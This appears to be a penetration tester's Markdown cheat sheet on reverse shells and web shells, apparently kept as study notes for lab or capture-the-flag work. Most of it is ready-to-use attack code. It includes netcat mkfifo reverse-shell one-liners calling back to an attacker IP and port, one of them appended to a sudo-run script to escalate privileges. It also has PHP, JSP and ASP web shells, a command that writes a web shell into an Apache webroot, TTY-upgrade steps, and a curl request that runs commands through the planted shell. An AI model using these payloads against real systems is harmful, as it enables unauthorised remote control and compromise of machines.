---
id: Reverse Shell
aliases:
  - Revshell
tags:
  - Pentest/Reverse-Shell
---

# Reverse Shell

- [RevShells.com](https://www.revshells.com/)
- [InternalAllTheThings - Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

<!-- Bash {{{-->
## Bash

```sh
script /dev/null -c bash
SHELL=/bin/bash script -q /dev/null
```

Append shell to sudo-executable file

```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f' | tee -a <file.sh>
```

### Upgrade to Interactive Shell

```sh
export TERM=xterm
```

^Z (CTRL+Z)

```sh
stty raw -echo; fg
```
<!-- }}} -->

<!-- Python {{{-->
## Python

Check if Python is installed on the server

```sh
which python
```

```sh
which python3
```

### Interactive shell

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> [!info]-
>
> - `c`: Run the following Python code in the command line
> - `import pty`: Import the pseudo-terminal module
> - `pty.spawn("/bin/bash")`: Spawn a new process and connect it to the
>   pseudo-terminal
<!-- }}} -->

<!-- PHP {{{-->
## PHP

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```
<!-- }}}-->

<!-- Upgrading TTY {{{-->
## Upgrading TTY

- [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

Map the TTY with the remote TTY

1. Hit `Ctrl + Z` to background the shell ang get back to the local terminal

```sh
^Z
```

2. Bring back the `netcat` shell to the foreground

```sh
stty raw -echo; fg
```

3. Hit `Enter` (or input `reset` and hit `Enter`)

4. Set shell variables to make the terminal full screen


```sh
# Show the `TERM` variable
export TERM=xterm
xterm-256color

# Show the values for `rows` and `columns`
stty size
67 318
```

Set the variables in the `netcat` shell

```sh
# Set `TERM`
export TERM=xterm-256color

# Set rows and columns
stty rows 67 columns 318
```
<!-- }}} -->

<!-- Web Shell {{{-->

# Web Shell

A Web Shell accepts the command through HTTP request parameters
(e.g. `GET`, `POST`) and prints the output to the webpage.

## Examples

PHP

```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP

```asp
<% eval request("cmd") %>
```

## Uploading a Web Shell

The web shell should be placed into the remote host's web root (through a
vulnerability or upload feature) and executed through the web browser.

| Web Server | Default Webroot          |
| ---------- | ------------------------ |
| Apache     | `/var/www/html/`         |
| Nginx      | `/usr/local/nginx/html/` |
| IIS        | `c:\inetpub\wwwroot\`    |
| XAMPP      | `C:\xampp\htdocs\`       |

The following `bash` command writes the web shell to a Linux machine running
Apache.

```sh
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

## Accessing Web Shell

The web shell may be accessed via a web browser or by using `cURL`.

```sh
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

A web shell would bypass any firewall restriction as it will not open a new
connection on a port bup use `80`or `443`.
<!-- }}} -->
